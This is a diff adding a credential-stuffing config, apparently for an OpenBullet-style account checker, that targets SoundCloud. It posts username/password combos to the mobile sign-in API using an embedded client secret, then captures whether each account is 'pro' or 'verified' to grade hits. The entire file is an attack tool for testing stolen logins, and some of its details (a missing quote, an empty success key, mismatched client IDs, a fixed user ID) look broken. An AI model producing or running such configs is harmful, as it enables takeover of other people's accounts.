@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "soundcloud",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-15T04:13:51.7548483+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://api-mobile.soundcloud.com/sign_in?client_id=dbdsA8b6V6Lw7wzu1x0T4CLxt58yd4Bf" AutoRedirect=TRUE 
+  CONTENT "{\"credentials\":{\"identifier\":<USER>\",\"password\":\"<PASS>\"},\"auth_method\":\"password\",\"client_id\":\"dbdsA8b6V6Lw7wzu1x0T4CLxt58yd4Bf\",\"client_secret\":\"aBK1xbehZvrBw0dtVYNY3BuJJOuDFrYs\",\"signature\":\"2:440ecfe6\",\"create_if_not_found\":false}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: SoundCloud/2018.07.12-release (Android 4.4.2; samsung SM-G955N)" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "" 
+REQUEST GET "https://api-mobile.soundcloud.com/users/soundcloud%3Ausers%3A478291839/profile/v2?client_id=dbdsA8b6V6Lw7wzu1x0T4CLxt58ud4Bf" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "is_pro\":false" 
+#PARSE_PRO PARSE "<SOURCE>" JSON "is_pro" Recursive=FALSE -> CAP "PRO" "" "" 
+#PARSE_VERIFIED PARSE "<SOURCE>" JSON "verified" Recursive=FALSE -> CAP "VERIFIED" "" "" 
